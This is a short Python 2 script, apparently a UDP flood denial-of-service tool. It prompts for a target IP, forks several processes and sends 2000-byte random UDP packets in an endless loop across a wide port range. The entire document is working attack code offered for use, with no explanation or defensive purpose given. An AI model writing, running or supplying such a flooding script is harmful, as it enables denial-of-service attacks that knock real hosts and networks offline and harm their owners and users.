import socket
import random
import os

def attack(ip):
	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	bytes=random._urandom(2000)

	port = 7777

	while 1:
		while port < 65535:
			sock.sendto(bytes,(ip,port))
			port = port + 1
		port = 49152


def child(ip):
	attack(ip)

def parent():

	counter = 0
	ip=raw_input('Target IP: ')
	while counter < 3: 
		pid = os.fork()
		if(pid == 0):
			child(ip)
		else:
			attack(ip)
		counter = counter + 1

parent()